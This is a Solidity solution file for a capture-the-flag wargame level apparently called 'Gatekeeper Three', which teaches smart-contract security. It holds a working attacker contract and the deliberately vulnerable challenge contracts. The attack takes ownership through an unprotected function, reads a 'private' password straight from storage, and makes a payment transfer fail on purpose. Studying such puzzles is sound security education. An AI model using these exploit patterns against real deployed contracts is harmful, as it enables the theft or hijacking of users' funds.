// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/**
 * @title 27. GATE KEEPER THREE
 * @dev Cope with gates and become an entrant.
 */

interface IKeeper {
    function owner() external view returns (address);

    function entrant() external view returns (address);

    function allowEntrance() external view returns (bool);

    function trick() external view returns (address);

    function construct0r() external;

    function getAllowance(uint _password) external;

    function createTrick() external;

    function enter() external;
}

interface ITrick {
    function checkPassword(uint256 _password) external view returns (bool);
}

/*
Use the public getter on remix to get the trick address;
Then, type this in the browser console to get the password:
await web3.eth.getStorageAt("0x...your trick address here", 2);
*/

contract GateSkipperThree {
    IKeeper private keeper =
        IKeeper(0xe05Caa08305692ea6Bb2DB43E4c96a1e7A51FDB0);
    address public trick;

    constructor() payable {
        keeper.createTrick();
        trick = keeper.trick();
    }

    function attack(bytes32 _password) public {
        // Gate 1: Contract become owner, thanks to the lack of access control
        keeper.construct0r();
        require(keeper.owner() == address(this), "Contract isn't owner!");

        // Gate 2: Deploy SimpleTrick and get password
        keeper.getAllowance(uint256(_password));
        require(keeper.allowEntrance(), "allowEntrance isn't true!");

        // Gate 3: deposit to keeper but revert on receive
        (bool success, ) = address(keeper).call{value: 0.0011 ether}("");
        require(success, "Deposit failed!");
        require(address(keeper).balance == 0.0011 ether, "Deposit failed!");

        keeper.enter();
        require(keeper.entrant() == msg.sender, "Attack failed!");
    }

    fallback() external {
        require(true == false);
    }
}

// 🎉 Level completed! 🎉

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (
            address(this).balance > 0.001 ether &&
            payable(owner).send(0.001 ether) == false
        ) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}
